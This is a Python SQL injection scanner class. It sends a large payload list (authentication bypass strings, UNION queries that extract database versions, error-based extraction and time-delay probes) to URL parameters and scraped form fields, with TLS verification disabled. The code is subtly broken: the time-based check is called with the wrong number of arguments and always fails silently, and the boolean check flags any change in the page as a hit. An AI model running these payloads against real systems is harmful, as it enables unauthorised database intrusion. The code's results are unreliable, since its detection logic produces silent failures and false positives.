import requests
from urllib.parse import urljoin, urlparse
import re
from bs4 import BeautifulSoup
import concurrent.futures
import time

class SQLInjectionTester:
    def __init__(self):
        # Expanded list including techniques for different DBs and blind SQLi
        self.payloads = [
            # Basic
            "'", "\"", "`",
            "' OR '1'='1", "\" OR \"1\"=\"1\"", "` OR `1`=`1`",
            "' OR '1'='1' -- ", "\" OR \"1\"=\"1\" -- ", "` OR `1`=`1` -- ",
            "' OR '1'='1' # ", "\" OR \"1\"=\"1\" # ", "` OR `1`=`1` # ",
            "' OR '1'='1'/*", "\" OR \"1\"=\"1\"/*", "` OR `1`=`1`/*",
            "admin' -- ", "admin\" -- ", "admin` -- ",
            "admin' # ", "admin\" # ", "admin` # ",
            "admin'/*", "admin\"/*", "admin`/*",
            
            # Union-based
            "' UNION SELECT NULL-- ",
            "' UNION SELECT NULL,NULL-- ",
            "' UNION SELECT NULL,NULL,NULL-- ",
            "' UNION SELECT @@version -- ", # MySQL version
            "' UNION SELECT version() -- ", # PostgreSQL version
            "' UNION SELECT sqlite_version() -- ", # SQLite version
            "' UNION SELECT NULL, banner FROM v$version WHERE ROWNUM=1 -- ", # Oracle version
            "' UNION SELECT @@SERVERNAME -- ", # MSSQL server name
            "-1 UNION SELECT NULL, @@version -- ", # Works if ID is integer
            "1' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'-- ", # Example login bypass

            # Error-based (Specific DBs)
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- ", # MySQL
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- ", # MySQL
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- ", # MySQL
            "' AND 1=(select count(*) from sysusers) --", # MSSQL
            "' AND 1=(select count(*) from tab) --", # Oracle
            "' OR CAST(1 AS numeric)=CAST(1 AS numeric)-- ", # PostgreSQL type juggling

            # Blind SQLi - Time-based
            "' AND SLEEP(5)-- ",
            "\" AND SLEEP(5)-- ",
            "` AND SLEEP(5)-- ",
            "1 AND SLEEP(5)", # Integer based
            "pg_sleep(5)--", # PostgreSQL
            "DBMS_LOCK.SLEEP(5)--", # Oracle
            "WAITFOR DELAY '0:0:5'--", # MSSQL
            "BENCHMARK(10000000,MD5(1))#", # MySQL
            "' AND IF(1=1, SLEEP(5), 0) -- ", # Conditional time delay

            # Blind SQLi - Boolean-based (Simple)
            "' AND '1'='1",
            "' AND '1'='2",
            "\" AND \"1\"=\"1\"",
            "\" AND \"1\"=\"2\"",
            "1 AND 1=1",
            "1 AND 1=2",
            "' AND EXISTS(SELECT * FROM users) -- ",
            "' AND LENGTH(database()) > 0 -- ",
            "' AND SUBSTRING(@@version, 1, 1) = '5' -- " # Example check
        ]
        
        # Expanded error patterns
        self.error_patterns = [
            # MySQL
            "SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result",
            "MySqlClient\.", "Unknown column '.*' in 'where clause'",
            "You have an error in your SQL syntax",
            # PostgreSQL
            "PostgreSQL.*ERROR", "Warning.*\Wpg_.*", "valid PostgreSQL result",
            "Npgsql\.", "PG::SyntaxError:", "syntax error at or near",
            # MSSQL
            "SQL Server.*Driver", "Warning.*mssql_.*", "Microsoft SQL Native Client error",
            "SQLServer JDBC Driver", "ODBC SQL Server Driver", "ODBC Driver.*SQL Server",
            "Unclosed quotation mark after the character string", "Incorrect syntax near",
            "System.Data.SqlClient.SqlException",
            # Oracle
            "ORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver",
            "Warning.*\Woci_.*", "quoted string not properly terminated",
            # SQLite
            "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
            "SQLite.ErrorCode", "SQLite3::", "near \" .* \": syntax error",
            # Generic
            "DB2 SQL error", "CLI Driver.*DB2", "Warning.*ibase_.*",
            "supplied argument is not a valid MySQL result resource",
            "Microsoft OLE DB Provider for ODBC Drivers error",
            "syntax error", "unexpected end of SQL command"
        ]

    def test_url(self, url, params=None):
        """Test a URL for SQL injection vulnerabilities"""
        results = {
            'vulnerable': False,
            'vulnerable_params': [],
            'details': []
        }
        
        if not params:
            params = self._get_default_params(url)
        
        for param in params:
            param_results = self._test_parameter(url, param)
            if param_results['vulnerable']:
                results['vulnerable'] = True
                results['vulnerable_params'].append(param)
                results['details'].extend(param_results['details'])
        
        return results

    def _get_default_params(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        params = []
        
        # Add URL path parameters
        if parsed.path:
            params.extend(parsed.path.split('/'))
        
        # Add query parameters
        if parsed.query:
            params.extend(parsed.query.split('&'))
        
        return list(set(params))

    def _test_parameter(self, url, param):
        """Test a specific parameter for SQL injection"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        original_value = self._get_parameter_value(url, param)
        if not original_value:
            return results
        
        for payload in self.payloads:
            try:
                # Test with payload
                test_url = self._inject_payload(url, param, payload)
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check for error messages
                if self._check_error_patterns(response.text):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'error_based',
                        'payload': payload,
                        'parameter': param
                    })
                    continue
                
                # Check for time-based injection
                if self._check_time_based_injection(url, param, payload):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'time_based',
                        'payload': payload,
                        'parameter': param
                    })
                    continue
                
                # Check for boolean-based injection
                if self._check_boolean_based_injection(url, param, payload, original_value):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'boolean_based',
                        'payload': payload,
                        'parameter': param
                    })
                
            except Exception as e:
                results['details'].append({
                    'type': 'error',
                    'message': str(e),
                    'parameter': param
                })
        
        return results

    def _get_parameter_value(self, url, param):
        """Extract parameter value from URL"""
        parsed = urlparse(url)
        if '=' in param:
            return param.split('=')[1]
        return None

    def _inject_payload(self, url, param, payload):
        """Inject payload into URL parameter"""
        if '=' in param:
            base, value = param.split('=')
            return url.replace(f"{base}={value}", f"{base}={payload}")
        return url.replace(param, payload)

    def _check_error_patterns(self, content):
        """Check response content for SQL error patterns"""
        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def _check_time_based_injection(self, url, param, payload, original_value):
        """Check for time-based SQL injection"""
        try:
            # Test with original value
            start_time = time.time()
            requests.get(url, timeout=10, verify=False)
            original_time = time.time() - start_time
            
            # Test with payload
            test_url = self._inject_payload(url, param, payload)
            start_time = time.time()
            requests.get(test_url, timeout=10, verify=False)
            payload_time = time.time() - start_time
            
            # If payload takes significantly longer, it might be vulnerable
            if payload_time > original_time + 5:
                return True
                
        except Exception:
            pass
        return False

    def _check_boolean_based_injection(self, url, param, payload, original_value):
        """Check for boolean-based SQL injection"""
        try:
            # Get original response
            original_response = requests.get(url, timeout=10, verify=False)
            original_content = original_response.text
            
            # Test with payload
            test_url = self._inject_payload(url, param, payload)
            payload_response = requests.get(test_url, timeout=10, verify=False)
            payload_content = payload_response.text
            
            # Compare responses
            if original_content != payload_content:
                return True
                
        except Exception:
            pass
        return False

    def scan_form(self, url):
        """Scan forms on a page for SQL injection vulnerabilities"""
        results = {
            'vulnerable_forms': [],
            'details': []
        }
        
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_results = self._test_form(url, form)
                if form_results['vulnerable']:
                    results['vulnerable_forms'].append(form.get('action', ''))
                    results['details'].extend(form_results['details'])
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results

    def _test_form(self, base_url, form):
        """Test a form for SQL injection vulnerabilities"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        try:
            # Get form action
            action = form.get('action', '')
            if action:
                if not action.startswith(('http://', 'https://')):
                    action = urljoin(base_url, action)
            else:
                action = base_url
            
            # Get form method
            method = form.get('method', 'get').lower()
            
            # Get form inputs
            inputs = form.find_all(['input', 'textarea'])
            for input_field in inputs:
                if input_field.get('type') in ['text', 'search', 'email', 'password']:
                    field_name = input_field.get('name')
                    if field_name:
                        for payload in self.payloads:
                            try:
                                # Test with payload
                                data = {field_name: payload}
                                if method == 'get':
                                    response = requests.get(action, params=data, timeout=10, verify=False)
                                else:
                                    response = requests.post(action, data=data, timeout=10, verify=False)
                                
                                # Check for vulnerabilities
                                if self._check_error_patterns(response.text):
                                    results['vulnerable'] = True
                                    results['details'].append({
                                        'type': 'error_based',
                                        'form': action,
                                        'field': field_name,
                                        'payload': payload
                                    })
                                    continue
                                
                                if self._check_time_based_injection(action, field_name, payload, None):
                                    results['vulnerable'] = True
                                    results['details'].append({
                                        'type': 'time_based',
                                        'form': action,
                                        'field': field_name,
                                        'payload': payload
                                    })
                                    continue
                                
                            except Exception as e:
                                results['details'].append({
                                    'type': 'error',
                                    'message': str(e),
                                    'form': action,
                                    'field': field_name
                                })
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results 